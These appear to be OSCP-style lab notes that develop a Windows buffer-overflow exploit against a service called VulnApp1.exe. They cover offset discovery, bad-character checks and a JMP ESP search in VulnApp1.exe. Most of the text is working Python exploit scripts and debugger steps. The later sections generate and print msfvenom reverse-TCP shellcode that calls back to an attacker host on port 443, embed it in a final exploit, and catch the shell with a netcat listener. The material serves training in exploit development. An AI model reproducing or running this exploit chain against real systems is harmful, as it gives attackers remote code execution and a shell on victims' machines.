VulnApp1.exe

# VulnApp1.exe

## Crash the app. 
We can crash the app with the original script. We change the IP to the Windows client IP 192.168.214.10, and convert the buffer value to use decimal.
![ba6320bd185ef62f55763a7fd84c21ff.png](../../../../_resources/af9552d94de648cd944169c23eebd6b6.png)
Here is the script:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ cat 1_poc.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = "A" * 2560
 
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(buffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

## Determine the offset
Replace the buffer with output from msf-pattern_create
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ msf-pattern_create -l 2560
```

Here is the script:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ cat 3_determineOffset.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2D"

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(buffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes at EIP33794332
![854995fbddcca0da86bf37722cc8f40b.png](../../../../_resources/d0d4b506325b41e9be5e9ec278a036b1.png)


## Verify the offset
Run msf-pattern_offset. The offset is at 2288
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/syncbreeze$ msf-pattern_offset -l 2560 -q 33794332
[*] Exact match at offset 2288 
```
Modify the poc to account for the offset. Here it is:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ cat 4_verifyOffset.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  #  msf-pattern_offset -l 2560 -q 33794332
  filler    = "A" * 2288
  eip       = "B" * 4
  buffer    = "C" * (2560 - len(filler) - len(eip))

  inputBuffer = filler + eip + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes at EIP 42424242.
![2494b2f226750d45cdf7f464a07fb10d.png](../../../../_resources/583fb61886ce4c46b9a0a6cede871ba4.png)

Take note that ESP lands at 03DEEE6C
![86c9e5b8e75240c83fb942b00519d6c3.png](../../../../_resources/b5650f74d55e4a9398fcf821a4dc7404.png)


## Find a place for shellcode
We will try using the technique of simply increasing the buffer. Let's increase it by an extra 500 bytes. Here is the code:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ cat 5_placeholder_for_shellcode.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  filler    = "A" * 2288
  eip       = "B" * 4
  offset    = "C" * 8   # ESP lands at 03DEEE6C
  buffer    = "D" * (3060 - len(filler) - len(eip) - len(offset))

  inputBuffer = filler + eip + offset + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes with EIP 42424242 and ESP 03CAEE6C (beginning of shellcode placeholder)
![0e0951b45c66c40001867d624af787a9.png](../../../../_resources/550529fd0ba849b9a14f318af0b4cc07.png)

## Find the bad characters
Here is the script with \x00 already taken out (it is a known bad character):
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ cat 6_check_bad_chars.py 
#!/usr/bin/python
import socket

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

try:
  print "\nSending evil buffer..."

  filler    = "A" * 2288
  eip       = "B" * 4
  offset    = "C" * 8   # ESP lands at 03DEEE6C

  inputBuffer = filler + eip + offset + badchars

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

The app crashes with EIP 42424242. ESP is 03CEEE6C
![aea3ea7ee01f86f5cb3ffaeb08569507.png](../../../../_resources/be490a12294945c89e9c76678ce60a9a.png)

Follow in Dump ESP 03CEEE6C. We see that the only bad character is \x00.
![2500d44c904dd42c849d7587e94b8680.png](../../../../_resources/1d4559cc32f94830b1860cafe1532112.png)


## Find a return address

The output from running `!mona modules`. We see VulnApp1.exe runs with Rebase, SafeSEH, ASLR, and NXCompat disabled, and OS Dll enabled. No other modules have the same features disabled. However, we do know that VulnApp1.exe address range does not contain bad characters (loads at \x14800000)
![bf509044745f494355bf17b6b2b82386.png](../../../../_resources/ea13eddbc80947da9e740e47863a5775.png)

Determine the opcode equivalent of JMP ESP using msf-nasm_shell.
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ msf-nasm_shell 
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > 
```

Search for the hex represention of the opcode (0xFFE4) in all sections of VulnApp1.exe with mona.py find. This is the string to input: `!mona find -s "\xff\xe4" -m "VulnApp1.exe"`
![4211c3c9ac1f0d8462802d3d7cbfc5ce.png](../../../../_resources/de4b26a34a224245b4206566492b6428.png)

We see that 1 pointer was found at \x148010cf, and this address does not contain any bad characters.
![fc2f53b1c247fc08cd00e0f10e40e927.png](../../../../_resources/3dd68b8bcb22461cb31f8e9303cde167.png)

We "Go to address in Disassembler" and see that it does contain the JMP ESP instruction.
![be253ee28a30a04f376c1c1dc835b0f6.png](../../../../_resources/2f75d30b87dc46f1bf0700d0bd7211cd.png)

Update our poc to use EIP \x148010cf
```
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1```python
$ cat 7_eip_jmp_esp.py 
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  filler    = "A" * 2288
  eip       = "\xcf\x10\x80\x14" # \x148010cf
  offset    = "C" * 8   # ESP lands at 03DEEE6C
  buffer    = "D" * (3060 - len(filler) - len(eip) - len(offset))

  inputBuffer = filler + eip + offset + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

Place a breakpoint on \x148010cf
![d45b3510ec56e6b72c580e8d15714f6d.png](../../../../_resources/2f5c639d26d94ce5b6df0ba5b52ef0d4.png)

Run the exploit. We see we reached the breakpoint
![06c8650d144b489d4c3fdde644d5b2e4.png](../../../../_resources/d59a1a62f1054c1d8f07f4e43ffafc4b.png)

Press F7 to single-step into our shellcode placeholder which is currently a bunch of D's.
![ee3ef6a8c2fa297440de2c740a623263.png](../../../../_resources/e0b44fef176f4bf2ac3668b6c1e5ac30.png)

## Generate the shellcode payload
Use msfvenom
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.214 lport=443 -f c -e x86/shikata_ga_nai -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xd9\xce\xd9\x74\x24\xf4\xbb\xfb\x41\xe4\x34\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x17\x03\x5a\x17\x83\x11\xbd\x06\xc1\x19\xd6\x45"
"\x2a\xe1\x27\x2a\xa2\x04\x16\x6a\xd0\x4d\x09\x5a\x92\x03\xa6"
"\x11\xf6\xb7\x3d\x57\xdf\xb8\xf6\xd2\x39\xf7\x07\x4e\x79\x96"
"\x8b\x8d\xae\x78\xb5\x5d\xa3\x79\xf2\x80\x4e\x2b\xab\xcf\xfd"
"\xdb\xd8\x9a\x3d\x50\x92\x0b\x46\x85\x63\x2d\x67\x18\xff\x74"
"\xa7\x9b\x2c\x0d\xee\x83\x31\x28\xb8\x38\x81\xc6\x3b\xe8\xdb"
"\x27\x97\xd5\xd3\xd5\xe9\x12\xd3\x05\x9c\x6a\x27\xbb\xa7\xa9"
"\x55\x67\x2d\x29\xfd\xec\x95\x95\xff\x21\x43\x5e\xf3\x8e\x07"
"\x38\x10\x10\xcb\x33\x2c\x99\xea\x93\xa4\xd9\xc8\x37\xec\xba"
"\x71\x6e\x48\x6c\x8d\x70\x33\xd1\x2b\xfb\xde\x06\x46\xa6\xb6"
"\xeb\x6b\x58\x47\x64\xfb\x2b\x75\x2b\x57\xa3\x35\xa4\x71\x34"
"\x39\x9f\xc6\xaa\xc4\x20\x37\xe3\x02\x74\x67\x9b\xa3\xf5\xec"
"\x5b\x4b\x20\xa2\x0b\xe3\x9b\x03\xfb\x43\x4c\xec\x11\x4c\xb3"
"\x0c\x1a\x86\xdc\xa7\xe1\x41\x23\x9f\x9e\x47\xcb\xe2\x60\x69"
"\xb7\x6a\x86\x03\xd7\x3a\x11\xbc\x4e\x67\xe9\x5d\x8e\xbd\x94"
"\x5e\x04\x32\x69\x10\xed\x3f\x79\xc5\x1d\x0a\x23\x40\x21\xa0"
"\x4b\x0e\xb0\x2f\x8b\x59\xa9\xe7\xdc\x0e\x1f\xfe\x88\xa2\x06"
"\xa8\xae\x3e\xde\x93\x6a\xe5\x23\x1d\x73\x68\x1f\x39\x63\xb4"
"\xa0\x05\xd7\x68\xf7\xd3\x81\xce\xa1\x95\x7b\x99\x1e\x7c\xeb"
"\x5c\x6d\xbf\x6d\x61\xb8\x49\x91\xd0\x15\x0c\xae\xdd\xf1\x98"
"\xd7\x03\x62\x66\x02\x80\x92\x2d\x0e\xa1\x3a\xe8\xdb\xf3\x26"
"\x0b\x36\x37\x5f\x88\xb2\xc8\xa4\x90\xb7\xcd\xe1\x16\x24\xbc"
"\x7a\xf3\x4a\x13\x7a\xd6";
```

Update our poc with the shellcode and include 16 bytes of NOPs"
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln1$ cat 8_add_shellcode_yes_nops.py 
#!/usr/bin/python
import socket

shellcode = ("\xd9\xce\xd9\x74\x24\xf4\xbb\xfb\x41\xe4\x34\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x17\x03\x5a\x17\x83\x11\xbd\x06\xc1\x19\xd6\x45"
"\x2a\xe1\x27\x2a\xa2\x04\x16\x6a\xd0\x4d\x09\x5a\x92\x03\xa6"
"\x11\xf6\xb7\x3d\x57\xdf\xb8\xf6\xd2\x39\xf7\x07\x4e\x79\x96"
"\x8b\x8d\xae\x78\xb5\x5d\xa3\x79\xf2\x80\x4e\x2b\xab\xcf\xfd"
"\xdb\xd8\x9a\x3d\x50\x92\x0b\x46\x85\x63\x2d\x67\x18\xff\x74"
"\xa7\x9b\x2c\x0d\xee\x83\x31\x28\xb8\x38\x81\xc6\x3b\xe8\xdb"
"\x27\x97\xd5\xd3\xd5\xe9\x12\xd3\x05\x9c\x6a\x27\xbb\xa7\xa9"
"\x55\x67\x2d\x29\xfd\xec\x95\x95\xff\x21\x43\x5e\xf3\x8e\x07"
"\x38\x10\x10\xcb\x33\x2c\x99\xea\x93\xa4\xd9\xc8\x37\xec\xba"
"\x71\x6e\x48\x6c\x8d\x70\x33\xd1\x2b\xfb\xde\x06\x46\xa6\xb6"
"\xeb\x6b\x58\x47\x64\xfb\x2b\x75\x2b\x57\xa3\x35\xa4\x71\x34"
"\x39\x9f\xc6\xaa\xc4\x20\x37\xe3\x02\x74\x67\x9b\xa3\xf5\xec"
"\x5b\x4b\x20\xa2\x0b\xe3\x9b\x03\xfb\x43\x4c\xec\x11\x4c\xb3"
"\x0c\x1a\x86\xdc\xa7\xe1\x41\x23\x9f\x9e\x47\xcb\xe2\x60\x69"
"\xb7\x6a\x86\x03\xd7\x3a\x11\xbc\x4e\x67\xe9\x5d\x8e\xbd\x94"
"\x5e\x04\x32\x69\x10\xed\x3f\x79\xc5\x1d\x0a\x23\x40\x21\xa0"
"\x4b\x0e\xb0\x2f\x8b\x59\xa9\xe7\xdc\x0e\x1f\xfe\x88\xa2\x06"
"\xa8\xae\x3e\xde\x93\x6a\xe5\x23\x1d\x73\x68\x1f\x39\x63\xb4"
"\xa0\x05\xd7\x68\xf7\xd3\x81\xce\xa1\x95\x7b\x99\x1e\x7c\xeb"
"\x5c\x6d\xbf\x6d\x61\xb8\x49\x91\xd0\x15\x0c\xae\xdd\xf1\x98"
"\xd7\x03\x62\x66\x02\x80\x92\x2d\x0e\xa1\x3a\xe8\xdb\xf3\x26"
"\x0b\x36\x37\x5f\x88\xb2\xc8\xa4\x90\xb7\xcd\xe1\x16\x24\xbc"
"\x7a\xf3\x4a\x13\x7a\xd6")

try:
  print "\nSending evil buffer..."

  filler    = "A" * 2288
  eip       = "\xcf\x10\x80\x14" # \x148010cf
  offset    = "C" * 8
  nops      = "\x90" * 16

  inputBuffer = filler + eip + offset + nops + shellcode

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

Open a netcat listener on Kali
```plaintext
kali@kali:~$ sudo nc -lnvp 443
listening on [any] 443 ...
```

Run the exploit again (remove the JMP ESP breakpoint). Notice we now have shell on the Kali listener
![a5d7fafea0ed00fb370e40ea251f0006.png](../../../../_resources/80e3407ab8844e7b8941deb97dc3a05d.png)

We see on TCP View that the exploit did not crash the app. There is no further need to improve the exploit.
![989cc3f901f57e26e74cc6bfbcfc748a.png](../../../../_resources/9113b8938569435c8bc3169c2003d41f.png)


